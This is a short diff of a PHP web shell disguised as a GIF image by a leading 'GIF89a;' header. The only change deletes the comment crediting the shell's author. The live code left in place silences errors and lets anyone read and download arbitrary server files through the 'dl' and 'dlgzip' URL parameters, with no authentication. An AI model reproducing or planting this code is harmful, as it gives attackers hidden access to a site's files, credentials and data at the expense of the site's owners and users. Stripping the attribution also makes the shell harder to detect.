@@ -1,6 +1,5 @@
 GIF89a;
 <?php
-// clear shell by CoderVb2 Turkhackteam.org
 set_time_limit(0);error_reporting(0);
 if(isset($_GET["dl"]) && ($_GET["dl"] != "")){$file = $_GET["dl"];$filez = @file_get_contents($file);header("Content-type: application/octet-stream");header("Content-length: ".strlen($filez));header("Content-disposition: attachment;filename=".basename($file).";");echo $filez;exit;} 
 elseif(isset($_GET["dlgzip"]) && ($_GET["dlgzip"] != "")){$file = $_GET['dlgzip'];$filez = gzencode(@file_get_contents($file));header("Content-Type:application/x-gzip\n");header("Content-length: ".strlen($filez));header("Content-disposition: attachment;filename=".basename($file).".gz;");echo $filez;exit;} 
